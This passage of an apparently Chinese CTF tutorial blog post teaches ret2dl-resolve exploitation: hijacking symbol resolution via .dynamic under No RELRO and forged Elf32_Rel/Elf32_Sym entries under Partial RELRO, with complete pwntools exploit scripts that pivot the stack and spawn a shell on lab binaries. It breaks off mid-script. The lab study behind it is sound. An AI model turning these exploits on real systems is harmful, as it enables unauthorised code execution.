class="comment">#替换read和system</span></span><br></pre></td></tr></table></figure><p>调用read为我们后面在栈里写入做一个准备,然后做一个栈迁移,将栈迁移到.bss段,而这里需要注意的是我们栈是向下生长的，我们需要给其留足空间，防止其进入不可写的页，这里卡了我好久，一开始留出了0x100的空间，结果到后面一直出问题，调试了一个下午，这里要<strong>感谢帮助我和我一起讨论的师傅们，还要特别感谢ha1vk师傅帮我点出这个问题</strong>，要不是他们我可能再用一个晚上都解决不了这个问题。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offsetct+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)<span class="comment">#这里是为了将下面三个参数弹出栈而调用下面的gadget</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)<span class="comment">#将栈迁移到.bss段上</span></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>接下来就是改写.dynamic在里面写入我们伪造的.dynstr和“sh”，然后通过伪造的符号表让read调用system</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =p32(<span class="number">0</span>)<span class="comment">#ebp</span></span><br><span class="line">payload+=p32(read_plt)<span class="comment">#调用read向.dynamic读入虚假的地址</span></span><br><span class="line">payload+=p32(read_dl)<span class="comment">#传参调用_dl_runtime_resolve，使其调用system</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">7</span>)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)+<span class="string">&#x27;;sh&#x27;</span><span class="comment">#这里的参数实际上是p32(fake_stack+fake_str_offset)，但是这里会调用失败然后;结束命令，参数变为sh</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br></pre></td></tr></table></figure><p>这样就执行了system(‘sh’)。</p><p>其实最后这里如果觉得不舒服,想一次性直接调用system(‘/bin/sh\x00’)，也可以依照上面第一次rop的方法调用:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">4</span>)</span><br><span class="line">payload+=p32(read_dl)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(<span class="built_in">len</span>(payload)+<span class="number">8</span>+<span class="built_in">len</span>(fake_dynstr)+fake_stack)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_norelro_32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_norelro_32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offsetct=<span class="number">112</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x08049044</span></span><br><span class="line"></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line">ret=<span class="number">0x0804900e</span></span><br><span class="line"></span><br><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">str_offsetct=<span class="number">0x8</span></span><br><span class="line">dynamic_dynstr_addr=dynamic_addr+str_offsetct*<span class="number">0x8</span>+<span class="number">0x4</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x400</span></span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offsetct+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(read_plt)</span><br><span class="line">payload+=p32(read_dl)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(dynamic_dynstr_addr)+p32(<span class="number">7</span>)</span><br><span class="line">fake_str_offset=<span class="built_in">len</span>(payload)</span><br><span class="line">payload+=fake_dynstr</span><br><span class="line">payload+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">fake_str_addr=p32(fake_stack+fake_str_offset)+<span class="string">&#x27;;sh&#x27;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sn(io,fake_str_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="64位下通过修改-dynamic进行攻击（NO-RELOR）"><a href="#64位下通过修改-dynamic进行攻击（NO-RELOR）" class="headerlink" title="64位下通过修改.dynamic进行攻击（NO RELOR）"></a>64位下通过修改.dynamic进行攻击（NO RELOR）</h3><p>代码依旧是上面的代码，但是我们的编译命令要稍作更改<code>gcc -fno-stack-protector -z norelro -no-pie level3.c -o level3_norelro_32</code>这样就i可以完成编译了</p><p>64位下攻击更为便捷，基本上只需要一条rop链就可以完成我们的攻击，流程和之前几乎一样，甚至更为简单，这里就不过多进行赘述，直接上exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_norelro_64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_norelro_64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">120</span></span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_dl=<span class="number">0x0000000000401040</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401223</span></span><br><span class="line">pop_rsi_r15_ret=<span class="number">0x0000000000401221</span></span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line">dynamic_addr=elf.get_section_by_name(<span class="string">&#x27;.dynamic&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">success(<span class="string">&#x27;dynamic : &#x27;</span>+<span class="built_in">hex</span>(dynamic_addr))</span><br><span class="line">success(<span class="string">&#x27;dynstr : &#x27;</span>+<span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">dynamic_dynstr_addr=<span class="number">0x403220</span></span><br><span class="line"></span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">fake_dynstr=dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line">fake_dynstr_len=<span class="built_in">len</span>(fake_dynstr)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*offset</span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read_plt)<span class="comment">#向.bss段写入虚假的strtab还有/bin/sh\x00</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_r15_ret)</span><br><span class="line">payload+=p64(dynamic_dynstr_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(read_plt)<span class="comment">#改写.dynamic的dynstr指针</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(bss_addr+fake_dynstr_len)</span><br><span class="line">payload+=p64(ret)</span><br><span class="line">payload+=p64(read_dl)<span class="comment">#传参调用_dl_runtime_resolve，使其调用system</span></span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=fake_dynstr+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">payload=p64(bss_addr)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="32位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO）"><a href="#32位下伪造reloc-age和伪造Elf32-Rel、Elf32-Sym结构体进行攻击（Partial-RELRO）" class="headerlink" title="32位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO）"></a>32位下伪造reloc_age和伪造Elf32_Rel、Elf32_Sym结构体进行攻击（Partial RELRO）</h3><p>还是上面的程序不过这里我们做一些修改，使其RELRO保护变为Partial RELRO。编译命令为</p><p><code>gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie  leve3.c -o level3_partialrelro_32</code>在这种情况下我们之前的攻击方式就会变得无效，因为.dynamic会变得不可写，所以我们不能再用同样的方法攻击。这里就要采用我们攻击思路的第二条了</p><p>我们先展示一下Elf32_Rel和Elf32_Sym的结构是怎么样的，以便后面伪造</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info; </span><br><span class="line">&#125;Elf32_Rel;</span><br></pre></td></tr></table></figure><p>结构体中的成员我们在之前蒋的静态链接介绍过，二者都占有一个字长即为4个字节</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name; </span><br><span class="line">    Elf32_Addr st_value;</span><br><span class="line">    Elf32_word st_size; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info; </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; </span><br><span class="line">    Elf32_Section st_shndx; </span><br><span class="line">&#125;Elf32_Sym;</span><br></pre></td></tr></table></figure><p>符号表项的具体结构也在上次的静态链接中介绍过，这里重点在于st_name，其决定了其符号的字符串在字符串表的位置。</p><p>我们先列出后面需要用到的地址plt_0的地址可以在ida中找到，如果找不到可以</p><p>先查找<a href="mailto:&#114;&#x65;&#97;&#100;&#x40;&#x67;&#111;&#116;&#46;&#112;&#108;&#x74;">&#114;&#x65;&#97;&#100;&#x40;&#x67;&#111;&#116;&#46;&#112;&#108;&#x74;</a>里存放的代码地址</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210818202356235.png" alt="查看.got.plt表"></p><p>然后再查看这部分代码就可以得到plt0的位置啦</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210818202734272.png" alt="查看代码得到plt0"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset=<span class="number">112</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">write_plt_without_push=<span class="number">0x08049060</span><span class="comment">#和plt_0等价</span></span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line"></span><br><span class="line">rel_plt_addr=elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr_addr=elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym_addr=elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">bss_addr=elf.get_section_by_name(<span class="string">&#x27;.bss&#x27;</span>).header.sh_addr</span><br><span class="line">fake_stack=bss_addr+<span class="number">0x600</span></span><br></pre></td></tr></table></figure><p>接下来还是一样做栈迁移到.bss段，并做后续的工作，防止爆栈</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*offset+p32(read_plt)</span><br><span class="line">payload+=p32(pop_esi_edi_ebp_ret)</span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(fake_stack)+p32(<span class="number">0x300</span>)</span><br><span class="line">payload+=p32(pop_ebp_ret)</span><br><span class="line">payload+=p32(fake_stack)</span><br><span class="line">payload+=p32(leave_ret)</span><br><span class="line"></span><br><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>接下来我们也借用CTF Wiki的渐进思路来一步步深入的学习这个部分</p><h4 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h4><p>我们先做简单的一步，手动调用plt[0]，来解析write函数，将我们的命令打印出来即可。我们需要提前将write_reloc_age给push进栈，也就是我们只要在栈里存放着write的write_reloc_age即可。这里寻找write的reloc_age也和之前找plt[0]的方法一样。</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820151957887.png" alt="寻找write的reloc_age"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">write_reloc_age=<span class="number">0x10</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820155824511.png" alt="得到我们的/bin/sh\x00"></p><h4 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h4><p>我们这步控制好reloc_age的大小，然后使得reloc落在我们可以控制的.bss段，让其指向我们伪造的write重定位项，这样就可以控制道r_info</p><p>我们先查看我们我们文件的重定位表<code>readelf -r level3_partialrelro_32</code></p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820165349463.png" alt="查看重定位表"></p><p>这样就可以找到我们write的r_info</p><p>剩下的就是将write的指针指向我们我们复制在.bss段的重定位项。更改一下我们之前的payload即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r_info=<span class="number">0x407</span></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="number">4</span>*<span class="number">4</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=p32(write_got)</span><br><span class="line">payload+=p32(r_info)</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()x00</span><br></pre></td></tr></table></figure><p>成功输出了/bin/sh\x00</p><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210820171854054.png" alt="同样得到我们的/bin/sh、x00"></p><h4 id="阶段三"><a href="#阶段三" class="headerlink" title="阶段三"></a>阶段三</h4><p>这一阶段我们控制我们之前控制好的r_info，使得write的Elf32_Sym落在我们的可控范围内</p><p>我知道我们的r_info分为两部分，32位下，第八位为重定位入口类型，高24位为重定位入口的符号在符号表的下标。</p><p>我们write的r_info是0x407，也就是偏移为4，重定位类型为7</p><p>这里我们要将write的Elf32_Sym到我们的.bss段上，而且要保证其16字节对齐</p><p>我们除了修改r_info之外还要复制一份write的Elf32_Sym。先查看一下其内容，由于之前我们得到其offset为4，那么我们可以通过查看整个symtab得到他</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820204830683.png" alt="获取write的Elf32_Sym"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#这里是为了保证我们wrte函数虚假的符号表项地址是16字节对齐的，这里为后面做一个补齐</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#最后|0x7是为了保证重定位类型不变</span></span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(<span class="number">0x31</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+align+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="阶段四"><a href="#阶段四" class="headerlink" title="阶段四"></a>阶段四</h4><p>在上一阶段我们控制了Elf32_Sym，接下来就可以控制字符串表了，我们可以通过修改st_name来寻找到字符串表，将其放置在我们的.bss段</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sla(io,<span class="string">&#x27;Input:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_write_reloc_age=fake_stack+<span class="number">7</span>*<span class="number">4</span>-rel_plt_addr</span><br><span class="line">align=<span class="number">0x10</span>-((fake_stack+<span class="number">36</span>-dynsym_addr)%<span class="number">16</span>)<span class="comment">#这里是为了保证我们wrte函数虚假的符号表项地址是16字节对齐的，这里为后面做一个补齐</span></span><br><span class="line">fake_write_Elf32_Sym_addr=fake_stack+<span class="number">36</span>+align</span><br><span class="line">fake_info=((((fake_write_Elf32_Sym_addr-dynsym_addr)//<span class="number">16</span>)&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span>)<span class="comment">#最后|0x7是为了保证重定位类型不变</span></span><br><span class="line">fake_write_str_addr=fake_stack+<span class="number">36</span>+align+<span class="number">0x10</span></span><br><span class="line">fake_st_name=fake_write_str_addr-dynstr_addr</span><br><span class="line"></span><br><span class="line">fake_write_Elf32_Rel=p32(write_got)+p32(fake_info)</span><br><span class="line">fake_write_Elf32_Sym=p32(fake_st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line">fake_write_str=<span class="string">&#x27;write\x00&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)</span><br><span class="line">payload+=p32(plt_0)</span><br><span class="line">payload+=p32(fake_write_reloc_age)</span><br><span class="line">payload+=p32(main_addr)<span class="comment">#返回地址</span></span><br><span class="line">payload+=p32(<span class="number">1</span>)</span><br><span class="line">payload+=p32(fake_stack+<span class="built_in">len</span>(payload)+<span class="built_in">len</span>(fake_write_Elf32_Rel)+<span class="built_in">len</span>(fake_write_Elf32_Sym)+<span class="built_in">len</span>(fake_write_str)+align+<span class="number">8</span>)</span><br><span class="line">payload+=p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload+=fake_write_Elf32_Rel</span><br><span class="line">payload+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=fake_write_Elf32_Sym</span><br><span class="line">payload+=fake_write_str</span><br><span class="line">payload+=cmd</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">sl(io,payload)</span><br><span class="line">rv(io)</span><br></pre></td></tr></table></figure><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20210820211523106.png" alt="同样成功"></p><h4 id="阶段五"><a href="#阶段五" class="headerlink" title="阶段五"></a>阶段五</h4><p>既然我们已经控制了字符串表，剩下的就是将其修改掉即可，我们只要将write修改为system，还有将关于偏移和函数调用的参数全部修改即可将write劫持到system从而拿取shell。</p><p>最终exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./level3_partialrelro_32&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level3_partialrelro_32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> p, x ,drop=<span class="literal">False</span>: p.recvuntil(x,drop)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x            : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p               : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x            : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>       : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b        : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t            : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x            : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt=elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">plt_0=<span class="number">0x8049030</span></span><br><span class="line">write_plt_without_push=<span class="number">0x08049060</span><span class="comment">#和plt_0等价</span></span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080492b3</span></span><br><span class="line">pop_esi_edi_ebp_ret=<span class="number">0x080492b1</span></span><br><span class="line">leave_ret=<span class="number">0x08049125</span></span><br><span class="line">ret=<span class="number">0x0804900e</span></span><br><span class="line"></span><br><span 